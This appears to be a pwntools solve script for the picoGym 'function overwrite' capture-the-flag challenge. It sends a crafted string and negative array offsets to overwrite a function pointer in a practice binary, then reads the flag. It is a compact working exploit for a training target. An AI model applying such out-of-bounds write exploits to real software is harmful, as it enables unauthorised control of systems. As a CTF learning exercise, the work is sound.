#!/usr/bin/env python3

"""
Toast's submission for the picoGym challenge function overwrite.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('addr', 4141)

    else:
        io = process([exe.path])

    return io


def main():
    '''Return the flag.
    '''

    with conn() as io:
        flag = get_flag(io)
        log.success(f"Flag is: {flag}")


def get_flag(io):
    scanf_to_check_offset = -16
    fun_to_check_offset = -314
    io.sendline(b'~~~~~~~~~~M')
    io.recvline()
    io.sendline(b'-16 -314')
    io.recvline()
    flag = io.recvline()
    return flag.decode()


if __name__ == '__main__':
    main()
